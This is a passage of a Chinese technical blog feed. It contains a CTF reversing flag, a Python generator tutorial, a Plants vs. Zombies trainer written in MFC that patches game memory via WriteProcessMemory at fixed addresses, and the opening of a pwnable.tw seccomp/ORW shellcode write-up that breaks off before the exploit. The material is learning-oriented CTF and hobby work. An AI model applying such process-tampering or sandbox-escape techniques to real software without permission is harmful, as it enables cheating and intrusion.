看这一张图就知道了….</li></ul><hr><ul><li><p>补充: 重新测试了一遍…原来是我算法有个地方写错了…C和python的都写错了…</p></li><li><p>但python效率还是低, C的都按照错误算法输出了好多…但python一个都没输出….</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190521230608.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190521230708.png" alt></p><ul><li><p>加法优先级大于异或。。。</p></li><li><p>输出有多组,挨个代进去, 最后15 6 13这一组是正确的。</p></li><li><p>再结合IDA静态分析的结果,最后flag为:</p></li></ul><blockquote><p>jlflag{15613abc}</p></blockquote>]]></content>
      <categories>
        <category>逆向</category>
      </categories>
  </entry>
  <entry>
    <title>[Python]生成斐波那契数列的几种方式的对比与分析</title>
    <url>/2020/03/20/Python-%E7%94%9F%E6%88%90%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0%E5%88%97%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%E7%9A%84%E5%AF%B9%E6%AF%94%E4%B8%8E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/902690.jpg" alt></p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>写这篇文章为了记录<code>yield的用法</code>、<code>iterable对象相关知识</code>、<code>generator function</code> 、以及一些<code>python的小细节</code></p><p>测试环境:<code>python2.7.16</code></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><strong>斐波那契（Fibonacci）数列：除第一个和第二个数外，任意一个数都可由前两个数相加得到。</strong></p><h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fab</span><span class="params">(max)</span>:</span> </span><br><span class="line">    n, a, b = <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span> </span><br><span class="line">    <span class="keyword">while</span> n &lt; max: </span><br><span class="line">        <span class="keyword">print</span> b </span><br><span class="line">        a, b = b, a + b </span><br><span class="line">        n = n + <span class="number">1</span></span><br><span class="line">fab(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>该方法是常规方法，通过在函数里面调用<code>print b</code>来实现打印。</p><p>但是该方法<strong>可复用性较差，因为 fab 函数返回 None，其他函数无法获得该函数生成的数列。</strong></p><h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p><strong>要提高 fab 函数的可复用性，最好不要直接打印出数列，而是返回一个 List。</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fab</span><span class="params">(max)</span>:</span> </span><br><span class="line">    n, a, b = <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span> </span><br><span class="line">    L = [] </span><br><span class="line">    <span class="keyword">while</span> n &lt; max: </span><br><span class="line">        L.append(b) </span><br><span class="line">        a, b = b, a + b </span><br><span class="line">        n = n + <span class="number">1</span> </span><br><span class="line">    <span class="keyword">return</span> L</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> fab(<span class="number">5</span>): </span><br><span class="line">    <span class="keyword">print</span> n</span><br></pre></td></tr></table></figure><p>该方法<strong>能满足复用性的要求</strong>，但该函数在运行中占用的内存会随着参数 max 的增大而增大，如果要<strong>控制内存占用</strong>，最好不要用 List来保存中间结果，而是通过 iterable 对象来迭代。</p><h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>): <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><code>range()方法</code>会导致生成一个 1000 个元素的 List。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1000</span>): <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><code>xrange()方法</code>则不会生成一个 1000 个元素的 List，而是在每次迭代中返回下一个数值，内存空间占用很小。因为 xrange 不返回 List，而是返回一个 iterable 对象。</p><h1 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fab</span><span class="params">(object)</span>:</span> </span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, max)</span>:</span> </span><br><span class="line">        self.max = max </span><br><span class="line">        self.n, self.a, self.b = <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span> </span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span><span class="params">(self)</span>:</span> </span><br><span class="line">        <span class="keyword">return</span> self </span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span> </span><br><span class="line">        <span class="keyword">if</span> self.n &lt; self.max: </span><br><span class="line">            r = self.b </span><br><span class="line">            self.a, self.b = self.b, self.a + self.b </span><br><span class="line">            self.n = self.n + <span class="number">1</span> </span><br><span class="line">            <span class="keyword">return</span> r </span><br><span class="line">        <span class="keyword">raise</span> StopIteration()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> Fab(<span class="number">5</span>): </span><br><span class="line">    <span class="keyword">print</span> n</span><br></pre></td></tr></table></figure><p>Fab 类通过 next() 不断返回数列的下一个数，内存占用始终为<code>常数</code>，但是这种方法的代码不够简洁。</p><h1 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h1><p>如果我们想要保持第一版 fab 函数的<code>简洁性</code>，同时又要获得<code>iterable 的效果</code>，yield 就派上用场了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fab</span><span class="params">(max)</span>:</span> </span><br><span class="line">    n, a, b = <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span> </span><br><span class="line">    <span class="keyword">while</span> n &lt; max: </span><br><span class="line">        <span class="keyword">yield</span> b      <span class="comment"># 使用 yield</span></span><br><span class="line">        <span class="comment"># print b </span></span><br><span class="line">        a, b = b, a + b </span><br><span class="line">        n = n + <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> fab(<span class="number">5</span>): </span><br><span class="line">    <span class="keyword">print</span> n</span><br></pre></td></tr></table></figure><p>简单地讲，<code>yield</code> 的作用就是把一个函数变成一个 <code>generator(生成器)</code>，带有 <code>yield</code> 的函数不再是一个普通函数，Python 解释器会将其视为一个 <code>generator</code>，调用 <code>fab(5)</code> 不会执行 <code>fab</code> 函数，而是返回一个<code>iterable</code> 对象！在 for 循环执行时，每次循环都会执行 <code>fab 函数</code>内部的代码，执行到<code>yield b</code>时，fab 函数就返回一个迭代值，下次迭代时，代码从 <code>yield b</code> 的下一条语句继续执行，而函数的本地变量看起来和上次中断执行前是完全一样的，于是函数继续执行，直到再次遇到<code>yield</code>。</p><p>也可以手动调用 fab(5) 的 next() 方法（因为<code>fab(5)</code>是一个<code>generator 对象</code>，该对象具有<code>next()</code>方法），这样我们就可以更清楚地看到 fab 的执行流程：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;f = fab(<span class="number">5</span>) </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.next() </span><br><span class="line"><span class="number">1</span> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.next() </span><br><span class="line"><span class="number">1</span> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.next() </span><br><span class="line"><span class="number">2</span> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.next() </span><br><span class="line"><span class="number">3</span> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.next() </span><br><span class="line"><span class="number">5</span> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.next() </span><br><span class="line">Traceback (most recent call last): </span><br><span class="line"> File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt; </span><br><span class="line">StopIteration</span><br></pre></td></tr></table></figure><hr><p>在一个 generator function 中，如果没有 return，则默认执行至函数完毕，如果在执行过程中 return，则直接抛出 StopIteration 终止迭代。</p><p>示例:</p><p>如果直接对文件对象调用 read() 方法，会导致不可预测的内存占用。好的方法是利用固定长度的缓冲区来不断读取文件内容。通过 yield，我们不再需要编写读文件的迭代类，就可以轻松实现文件读取：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span><span class="params">(fpath)</span>:</span> </span><br><span class="line">    BLOCK_SIZE = <span class="number">1024</span> </span><br><span class="line">    <span class="keyword">with</span> open(fpath, <span class="string">'rb'</span>) <span class="keyword">as</span> f: </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>: </span><br><span class="line">            block = f.read(BLOCK_SIZE) </span><br><span class="line">            <span class="keyword">if</span> block: </span><br><span class="line">                <span class="keyword">yield</span> block </span><br><span class="line">            <span class="keyword">else</span>: </span><br><span class="line">                <span class="keyword">return</span></span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.ibm.com/developerworks/cn/opensource/os-cn-python-yield/" target="_blank" rel="noopener">参考链接</a></p>]]></content>
      <categories>
        <category>随手小记</category>
      </categories>
  </entry>
  <entry>
    <title>My First MFC Program</title>
    <url>/2020/12/22/My-First-MFC-Program/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/71766980_p0.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>由于这几天在忙着研究外挂开发…</p><p>但是很遗憾，我并不会图形化界面程序开发…</p><p>昨晚开着二倍速和快进用俩小时看完了清华大学的一位教授出的Windows桌面应用程序开发教程…</p><p>看完发现，用Windows桌面应用程序开发来开发一款外挂对我来说还要学不少，比如还要再去研究各种类，如Button类等，学习周期比较长。</p><p>但我想尽快开发出来目标软件，这时候似乎只有VB、Delphi、MFC、易语言可以选择了。</p><p>VB和Delphi我不太熟悉，易语言的话，许多年前接触过，但基本语法忘得差不多了，以后再复习吧。</p><p>最终我还是选择了MFC，记得大一下学期老师让用MFC开发飞机大战，但我全程在摸鱼…</p><p>用了半天大概学会了MFC开发流程，并开发出了一个简易的植物大战僵尸辅助。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20201222170415.png" alt></p><h1 id="0x01-主要代码"><a href="#0x01-主要代码" class="headerlink" title="0x01 主要代码"></a>0x01 主要代码</h1><h2 id="一些宏和全局变量"><a href="#一些宏和全局变量" class="headerlink" title="一些宏和全局变量"></a>一些宏和全局变量</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//一些宏</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SUN_SHINE_BASE_ADDR 0x755E0C				<span class="comment">//阳光基址</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SUN_SHINE_OFFSET_FIRST 0x868			<span class="comment">//一级偏移</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SUN_SHINE_OFFSET_SECOND 0x5578				<span class="comment">//二级偏移值</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NoCD_ADDR 0x49E947</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//全局变量处</span></span><br><span class="line">DWORD NumOfSum;</span><br><span class="line">HANDLE Process;</span><br><span class="line">DWORD Size;</span><br></pre></td></tr></table></figure><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>功能是获取程序句柄，赋值给HANDLE类型的全局变量Process</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CMFCTestDlg::OnBnClickedButton1()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">	<span class="comment">//获取程序句柄</span></span><br><span class="line">	DWORD PID = <span class="number">0</span>;</span><br><span class="line">	HWND hWinmine = ::FindWindow(<span class="literal">NULL</span>, _T(<span class="string">"Plants vs. Zombies"</span>));	<span class="comment">//找到窗口</span></span><br><span class="line">	GetWindowThreadProcessId(hWinmine, &amp;PID);				<span class="comment">//获取进程标识</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == PID)</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(_T(<span class="string">"获取PID失败\n"</span>));</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	Process = OpenProcess(PROCESS_ALL_ACCESS, <span class="number">0</span>, PID);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == Process)</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(_T(<span class="string">"进程打开失败\n"</span>));</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	MessageBox(_T(<span class="string">"启动成功!"</span>));</span><br><span class="line">	UpdateSunNum();<span class="comment">//自定义的函数,作用是更新当前阳光值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="文本框"><a href="#文本框" class="headerlink" title="文本框"></a>文本框</h2><p>目的是获取用户输入的想修改的阳光值,赋值给int型的全局变量NumOfSum</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CMFCTestDlg::OnEnChangeEdit1()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span>  如果该控件是 RICHEDIT 控件，它将不</span></span><br><span class="line">	<span class="comment">// 发送此通知，除非重写 CDialogEx::OnInitDialog()</span></span><br><span class="line">	<span class="comment">// 函数并调用 CRichEditCtrl().SetEventMask()，</span></span><br><span class="line">	<span class="comment">// 同时将 ENM_CHANGE 标志“或”运算到掩码中。</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span>  在此添加控件通知处理程序代码</span></span><br><span class="line">	CString str;</span><br><span class="line">	GetDlgItem(IDC_EDIT1)-&gt;GetWindowText(str);</span><br><span class="line">	NumOfSum = StrToInt(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="修改阳光值"><a href="#修改阳光值" class="headerlink" title="修改阳光值"></a>修改阳光值</h2><p>顾名思义，根据用户在文本框中输入的阳光值来修改阳光值</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CMFCTestDlg::OnBnClickedButton2()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">	<span class="keyword">if</span> (Process == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		MessageBox(_T(<span class="string">"请先点启动!"</span>));</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//修改阳光值</span></span><br><span class="line">	DWORD SunShineBaseAddressValue = <span class="number">0</span>;</span><br><span class="line">	DWORD SunShineOffsetFirstValue = <span class="number">0</span>;</span><br><span class="line">	DWORD SunShineNum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == ReadProcessMemory(Process, (LPVOID)SUN_SHINE_BASE_ADDR, &amp;SunShineBaseAddressValue, <span class="keyword">sizeof</span>(DWORD), &amp;Size))</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(_T(<span class="string">"获取基址失败\n"</span>));</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == ReadProcessMemory(Process, (LPVOID)(SunShineBaseAddressValue + SUN_SHINE_OFFSET_FIRST), &amp;SunShineOffsetFirstValue, <span class="keyword">sizeof</span>(DWORD), &amp;Size))</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(_T(<span class="string">"获取一级偏移失败\n"</span>));</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == WriteProcessMemory(Process, (LPVOID)(SunShineOffsetFirstValue + SUN_SHINE_OFFSET_SECOND), &amp;NumOfSum, <span class="keyword">sizeof</span>(DWORD), &amp;Size))</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(_T(<span class="string">"内存写入失败\n"</span>));</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	MessageBox(_T(<span class="string">"阳光值修改成功!"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="更新当前阳光值"><a href="#更新当前阳光值" class="headerlink" title="更新当前阳光值"></a>更新当前阳光值</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CMFCTestDlg::UpdateSunNum()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (Process == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD SunShineBaseAddressValue = <span class="number">0</span>;</span><br><span class="line">	DWORD SunShineOffsetFirstValue = <span class="number">0</span>;</span><br><span class="line">	DWORD SunShineNum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == ReadProcessMemory(Process, (LPVOID)SUN_SHINE_BASE_ADDR, &amp;SunShineBaseAddressValue, <span class="keyword">sizeof</span>(DWORD), &amp;Size))</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(_T(<span class="string">"获取基址失败\n"</span>));</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == ReadProcessMemory(Process, (LPVOID)(SunShineBaseAddressValue + SUN_SHINE_OFFSET_FIRST), &amp;SunShineOffsetFirstValue, <span class="keyword">sizeof</span>(DWORD), &amp;Size))</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(_T(<span class="string">"获取一级偏移失败\n"</span>));</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == ReadProcessMemory(Process, (LPVOID)(SunShineOffsetFirstValue + SUN_SHINE_OFFSET_SECOND), &amp;SunShineNum, <span class="keyword">sizeof</span>(DWORD), &amp;Size))</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(_T(<span class="string">"获取二级偏移失败\n"</span>));</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	CString ssn;</span><br><span class="line">	ssn.Format(_T(<span class="string">"%d"</span>), SunShineNum);</span><br><span class="line">	SetDlgItemText(IDC_STATIC1, ssn);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="计时器"><a href="#计时器" class="headerlink" title="计时器"></a>计时器</h2><p>每秒刷新一下当前阳光值，这块因为一点小问题研究了半个多小时才搞明白….</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在Resource.h定义一下Timer</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Timer1                          0x01</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//转到xxxxxxDlg.cpp</span></span><br><span class="line">BEGIN_MESSAGE_MAP(CMFCTestDlg, CDialogEx)</span><br><span class="line">	......<span class="comment">//此处和下面出现的...表示我写博客的时候没把其他代码放上来,以突出重点</span></span><br><span class="line">	ON_WM_TIMER()</span><br><span class="line">END_MESSAGE_MAP()</span><br><span class="line"></span><br><span class="line">BOOL CMFCTestDlg::OnInitDialog()</span><br><span class="line">&#123;</span><br><span class="line">	......<span class="comment">//同上</span></span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此添加额外的初始化代码</span></span><br><span class="line">	StartTimer();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动timer</span></span><br><span class="line"><span class="keyword">void</span> CMFCTestDlg::StartTimer()</span><br><span class="line">&#123;</span><br><span class="line">	SetTimer(Timer1, <span class="number">1000</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线束timer</span></span><br><span class="line"><span class="keyword">void</span> CMFCTestDlg::StopTimer()</span><br><span class="line">&#123;</span><br><span class="line">	KillTimer(Timer1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// timer响应函数</span></span><br><span class="line"><span class="keyword">void</span> CMFCTestDlg::OnTimer(UINT nIDEvent)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">switch</span> (nIDEvent) &#123;</span><br><span class="line">	<span class="keyword">case</span> Timer1:</span><br><span class="line">		UpdateSunNum();<span class="comment">//每1秒刷新一下当前阳光值</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="无CD"><a href="#无CD" class="headerlink" title="无CD"></a>无CD</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CMFCTestDlg::OnBnClickedCheck1()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">	<span class="keyword">if</span> (Process == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		MessageBox(_T(<span class="string">"请先点启动!"</span>));</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CButton* pBtn = (CButton*)GetDlgItem(IDC_CHECK1);</span><br><span class="line">	<span class="keyword">int</span> state = pBtn-&gt;GetCheck();</span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == state) &#123;<span class="comment">//未被选中</span></span><br><span class="line">		DWORD hasCD = <span class="number">0x0</span>;</span><br><span class="line">		<span class="keyword">if</span> (<span class="number">0</span> == WriteProcessMemory(Process, (LPVOID)(NoCD_ADDR), &amp;hasCD, <span class="keyword">sizeof</span>(BYTE), &amp;Size))</span><br><span class="line">		&#123;</span><br><span class="line">			MessageBox(_T(<span class="string">"设置无CD失败 :( \n"</span>));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">1</span> == state) &#123;<span class="comment">//被选中</span></span><br><span class="line">		DWORD NOCD = <span class="number">0x01</span>;</span><br><span class="line">		<span class="keyword">if</span> (<span class="number">0</span> == WriteProcessMemory(Process, (LPVOID)(NoCD_ADDR), &amp;NOCD, <span class="keyword">sizeof</span>(BYTE), &amp;Size))</span><br><span class="line">		&#123;</span><br><span class="line">			MessageBox(_T(<span class="string">"恢复有CD失败 :( \n"</span>));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x02-效果图"><a href="#0x02-效果图" class="headerlink" title="0x02 效果图"></a>0x02 效果图</h1><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20201222171758.png" alt></p><p>无CD不太好放效果图。。。</p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>这也算是初次接触MFC吧</p><p>感觉好多地方可以优化</p><p>比如 每次都需要重新获取一下基址的值、一级偏移的值…这样多做了许多无用功吧，可以直接把一级偏移的值存入一个全局变量。</p><p>还有一些地方我感觉写的应该不太规范吧</p><p>比如没对句柄进行close….因为我没找到MFC中像Win32图形化编程里面那种switch/case中destory的情况在哪。</p><p>还有些地方并没对非法输入进行处理，没有异常处理之类的。</p><p>今后我会逐步改进的。</p>]]></content>
      <categories>
        <category>开发</category>
      </categories>
  </entry>
  <entry>
    <title>Pwnable_orw</title>
    <url>/2020/05/19/Pwnable-orw/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/44892197_p0.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>咕了许久，重拾本就会的不多的pwn，发现不太顺手了。</p><p>之前也接触过ORW的题目，但没去深入的了解其细节，只抄了个EXP拿了个flag就完事了。</p><p>今天用这道题目详细记录一下ORW类型的题目。</p><p>题目原出处是在pwnable.tw， BUUCTF上面也有。</p><h1 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a>0x01 题目分析</h1><h2 id="保护与main函数"><a href="#保护与main函数" class="headerlink" title="保护与main函数"></a>保护与main函数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200519000820.png" alt></p><p>主函数逻辑也特别简单，读取我们的输入存到变量shellcode处，然后执行<code>shellcode()</code>。</p><p>如果忽视掉第3行的<code>orw_seccomp()</code>那么就可以直接向程序输入一段shellcode就能getshell。</p><h2 id="seccomp"><a href="#seccomp" class="headerlink" title="seccomp"></a>seccomp</h2><p>第3行的内容也便是ORW这类题目的重点所在。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200519001045.png" alt></p><p>关于seccomp：</p><blockquote><p>seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。</p><p>seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system call），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止。</p><p>seccomp 简单来说就是一个白名单，每个进程进行系统调用（system call）时，kernal 都会检查对应的白名单以确认该进程是否有权限使用这个系统调用。这个白名单是用 berkeley package filter（BPF）格式书写的。</p></blockquote><p>具体可以参考如下链接：</p><p><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">大佬的博客</a></p><p><a href="https://blog.csdn.net/mashimiao/article/details/73607485" target="_blank" rel="noopener">CSDN</a></p><p>PS: 第一个博客里也讲到了这道题目是如何实现seccomp的了，是与<code>prctl</code>有关。</p><p>PS: 而我第一次遇到ORW的题目是在极客大挑战2019 的 babyshellcode和Not bad这俩题目，这俩题目都是通过<code>seccomp_rule_add</code>来实现seccomp的。</p><p>也就是说，这个程序相当于禁用了system。</p><p>这段程序中，unk_8048640位置存储的即为“白名单”，通过这个白名单，可以看到这个程序允许的系统调用。</p><p>之前看到过一篇博文，有师傅手动把这个白名单提取出来了，但是我找不到博文链接了。</p><h2 id="工具seccomp-tools"><a href="#工具seccomp-tools" class="headerlink" title="工具seccomp-tools"></a>工具seccomp-tools</h2><p>用工具<code>seccomp-tools</code>能更直观更便捷的查看这个“白名单”。</p><p>安装seccomp-tools步骤(环境Ubuntu 16.04)：</p><p>首先需要gem和ruby(版本&gt;=2.4)：</p><p>我用的阿里云的源，通过apt-get 安装的ruby版本是2.3，死活安不上2.4，Google了一番找到了安装方法：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-add-repository ppa:brightbox/ruby-ng</span><br><span class="line"></span><br><span class="line">$ sudo apt-get update</span><br><span class="line"></span><br><span class="line">$ sudo apt-get install ruby2.4 ruby2.4-dev</span><br></pre></td></tr></table></figure><p>然后<code>sudo gem install seccomp-tools</code>即可。</p><p>终端执行命令<code>$ seccomp-tools dump ./orw</code>即可查看“白名单”</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200519003049.png" alt></p><p>绿色的即为允许的系统调用。</p><p>可以看到该程序可以进行open read write等系统调用。</p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>结合前面的分析，<strong>这道题目的解题策略可以确定为ORW即open、read、write，也就是先打开存放flag的文件，将其内容读取到某块缓冲区，然后通过write打印出来。</strong></p><h1 id="0x02-Do-it！"><a href="#0x02-Do-it！" class="headerlink" title="0x02 Do it！"></a>0x02 Do it！</h1><h2 id="关于系统调用"><a 